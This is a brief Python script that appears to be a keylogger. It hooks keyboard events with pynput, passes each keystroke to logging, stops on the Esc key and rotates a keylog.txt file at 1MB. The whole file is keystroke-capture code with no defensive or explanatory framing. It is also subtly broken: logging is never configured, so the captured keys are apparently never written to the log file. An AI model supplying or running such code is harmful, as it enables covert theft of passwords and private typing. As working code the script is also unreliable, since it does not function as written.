import pynput
from pynput.keyboard import Key, Listener
import logging
import os
import time

log_file = "keylog.txt"
max_log_size = 1024 * 1024  # 1MB

def rotate_log_file():
    if os.path.exists(log_file):
        if os.path.getsize(log_file) > max_log_size:
            timestamp = int(time.time())
            os.rename(log_file, f"keylog_{timestamp}.txt")

def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        if key == key.space:
            logging.info(' ')
        else:
            logging.info(str(key))

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    rotate_log_file()
    listener.join()